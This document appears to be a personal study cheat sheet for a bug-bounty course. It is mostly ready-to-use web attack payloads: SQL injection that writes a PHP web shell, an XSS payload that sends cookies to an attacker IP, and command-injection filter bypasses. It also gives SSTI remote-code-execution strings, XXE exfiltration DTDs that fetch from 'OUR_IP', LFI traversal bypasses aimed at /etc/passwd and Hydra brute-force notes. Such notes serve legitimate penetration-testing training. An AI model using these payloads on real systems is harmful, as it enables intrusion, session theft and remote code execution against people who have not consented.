# CBBH
Stuff for CBBH


  JavaScript Deobsfucation - Tools
    
    https://beautifier.io/
    http://www.jsnice.org/


  Intro to MySQL

    Connect to database
    sudo service mysql start
    
    mysql -h 94.237.62.195 -P 39097 -u root --password
    -h : for host/target
    -P : for custom port
    -u : for user
    --password : for password
  
    Find stuff with queries
    
    select * from employees where first_name LIKE 'Bar%' AND hire_date='1990-01-01';
    LIKE : You may use when searching for a substring in string (i.e Bar = Barton).
    % : Starts with (used in mysql)

    ')+or+id=4--+-

    Database enumeration

    #Get it without line breaking
    '+union+select+1,group_concat(table_name),3,4+from+information_schema.tables--+-

    #Get it nicier
    '+union+select+1,table_schema,table_name,4,5+from+information_schema.tables--+-
    
    #Writing files
    '+union+select+null,null,null,"<?php+system($_REQUEST['cmd']);?>"+into+outfile+"/var/www/html/blah2.php"--+-

    #Get data from whithin another database
    '+union+select+1,username,password,4,5+from+backup.admin_bk--+-

  Cross-Site Scripting

    #When creating a phishing form the submit button has to be just like so
    <input type="submit" name="submit" value="login">

    #That's a way to remove unanted html stuff from the page [gotta wrap it between script tags]
    document.getElementById("id-here").remove();


    #To stealk cookies
    "><img src=x onerror=this.src="http://ip/?c"+document.cookie;>

  SQLmap

    ' , ; -- /* */
    
    ##TIP: IF YOU CAN FIND BOUNDARIES, TRY TO COUNT THE NUMBER OF COLUMNS AND SPECIFY IT IN SQLMAP
    
    #Techniques and their meaning
    B: Boolean-based blind
    E: Error-based
    U: Union query-based
    S: Stacked queries
    T: Time-based blind
    Q: Inline queries

    #To parse erros and see the response
    --parse-errors

    #Level/Risk
    Risk: Might cause database entry loss or DoS (Denial of Service) [1-3]
    Level: Extends vectors and boundaries (i.e the lower the expectancy, the higher the level) [1-5]

    #To display the payloads
    -v 3 [verbose level 3]

    #To provide a certain number of cols
    --union-cols=1337

    #Boundaries
    Once you've found a specific prefix, do not forget to add the apostrophe ' to it
    --prefix="<change-here>"
    --suffix="<change-here>"

    #Search function
    --search 
    -C: column
    -T: table
    -D: database

    #Handling csrf token
    ##NOTE: THE PROPER WAY TO HANDLE THIS KINDA TOKEN IS BY, PASSING THEM WHEREVER THEY APPEAR (e.g cookie/body) AND USE THE FLAG --csrf-token WITH THE NAME OF THE PARAM THAT HOLDS THE TOKEN
  
  Command Injection

    ##NOTE: If slash or backslash is blacklisted, you may use environment variable that have these chars
    <LINUX>
    ${PATH:0:1} - Uses the slash at the $PATH variable
    ${LS_COLORS:10:1} - Uses tha semi-colon at the $LS_COLORS variable

    <WINDOWS>
    echo %HOMEPATH:~6,-11%

    #You can actaully use environment variables inside of bash brace expension
    {ls,${PATH:0:1}home}
  
    #Blacklisted commands doesn't seem to work inside {}
    #This one is nicier
    bash<<<$(base64%09-d<<<$payload-here$)

    
  Injection Operator | Injection Character	| URL-Encoded Character| Executed Command
  |---|---|---|---|
  |Semicolon | ; |	%3b	| Both
  |New Line |	\\n | %0a | Both
  |Background | & | %26 | Both (second output generally shown first)
  |Pipe |	\| 	| %7c | Both (only second output is shown)
  |AND |	&& | %26%26 | Both (only if first succeeds)
  |OR | \|\|	| %7c%7c	| Second (only if first fails)
  |Sub-Shell |	\`\` | %60%60 |	Both (Linux-only)
  |Sub-Shell | $() | %24%28%29 | Both (Linux-only)

  ;
  \n
  &
  |
  &&
  ||
  ``
  $()
  %3b
  %0a
  %26
  %7c
  %26%26
  %7c%7c
  %60%60
  %24%28%29

  Server-Side Attacks

    #SSI cheat sheet

    // Date
    <!--#echo var="DATE_LOCAL" -->
    
    // Modification date of a file
    <!--#flastmod file="index.html" -->
    
    // CGI Program results
    <!--#include virtual="/cgi-bin/counter.pl" -->
    
    // Including a footer
    <!--#include virtual="/footer.html" -->
    
    // Executing commands
    <!--#exec cmd="ls" -->
    
    // Setting variables
    <!--#set var="name" value="Rich" -->
    
    // Including virtual files (same directory)
    <!--#include virtual="file_to_include.html" -->
    
    // Including files (same directory)
    <!--#include file="file_to_include.html" -->
    
    // Print all variables
    <!--#printenv -->

    #SSTI
    
    Cobalt SSTI payload - ${{<%[%'"}}%\.
    
    Tornado RCE
    {% import os %}{{ os.popen("id").read() }}

    Twig RCE
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("env")}}

    #Jinja1 RCE
    {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

  LOGIN BRUTE FORCING

    #Some hydra notes
    -u : by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first password is tried on all logins,  then
         the next password.
    -f : exit after the first found login/password pair

    http-get : For loging get based
    http-post-form : For loging post based (Ex.: /login.php:username=^USER^&password=^PASS^:F=<form name='login')

    # Custom stuff
    Custom password wordlist - https://github.com/Mebus/cupp
    Custom username wordlist - git clone https://github.com/urbanadventurer/username-anarchy.git


  UPLOAD ATTACK

    #Web content-type
    wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt

    #When trying to read a local file with xxe attack in scg, if `file:///` doesn't work right away, try php filter `php://filter/convert.base64-encode/resource=index.php`

    #This is another php wrapper when the another one fails
    php://filter/read=convert.base64-encode/resource=

    #When trying to bypass extension filter, this method `blah.php.jpg` is valid one, but it doens't work try `blah.jpg.php`

XXE attack 

    !!!REMINDER!!!
    Don't forget that you may also use php wrapper with it.

    #Quick check to determine whether the app is vulnerable or not
    #If it is, change `Sick` for a basic payloads
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE name [
    <!ENTITY xxe "Sick">
    ]>

    
    #Exfiltration with CDATA
    Echo this => `echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd` to a file

    <!DOCTYPE email [
    <!ENTITY % begin "<![CDATA[">
    <!ENTITY % file SYSTEM "fPAYLOAD">
    <!ENTITY % end "]]>"> 
    <!ENTITY % xxe SYSTEM "http://OUR_IP/xxe.dtd">
    %xxe;
    ]>

    #Then reference the &joined; entity in the form you're attacking (you gotta identify which field, from the form, is reflected on the page)

    
    #Error Based XXE - (This method is not as reliable as the previous one)
    Create a file with this (error.dtd)
    <!ENTITY % file SYSTEM "PAYLOAD">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

    #Then use the bellow payload in the request (strip off the form)
    <!DOCTYPE email [ 
    <!ENTITY % remote SYSTEM "http://OUR_IP/error.dtd">
    %remote;
    %error;
    ]>


    #Out-of-Band
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [ 
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
      %remote;
      %oob;
    ]>

FILE INCLUSION

    !!!Sometimes you/ve gotta to encode even slashes
    
    #Wordlists
    https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt
    https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux

    #When testing for LFI, check for `/etc/apache2/apache2.conf` and take note of the log dir. Then check for `/etc/apache2/envvars` and find out the value of the sever variable (e.g APACHE_LOG_DIR=/var/log/apache2$SUFFIX)

    /var/log/nginx/error.log
    /var/log/nginx/access.log
    extension=expect
    
    #LFI -  Basic Bypasses
    ....//....//....//....//etc/passwd
    %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc/passwd
    %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64
    ..././..././..././..././etc/passwd
    %2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2fetc/passwd
    %2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%65%74%63%2f%70%61%73%73%77%64
    ....////....////....////....////etc/passwd
    %2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2fetc/passwd
    %2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64


    #Check php.ini to see whether `allow_url_include` is enabled or not (c/php/7.4/apache2/php.ini).
    #If it is enaled it might be possible to achieve RCE with the data wrapper
    #See if you can load a url. If so, you might be able to achieve RCE through RFI
    
    echo '<?php system($_GET["cmd"]);   ?>' | base64 -w0
    data://text/plain;base64,<BASE64-STRING>&cmd=id


SOAP EXPLOITATION

    #check for `wsdl?wsdl`

    XML Structure for SOAP API
    <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/"
    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
    <soap:Body>
      <LoginRequest xmlns="http://tempuri.org/">
        <cmd>
          uname -a
        </cmd>
      </LoginRequest>
    </soap:Body>
    </soap:Envelope>
    
    #Mind this
    #SOAPSpoofing is when you use method-A with action of method-B

    
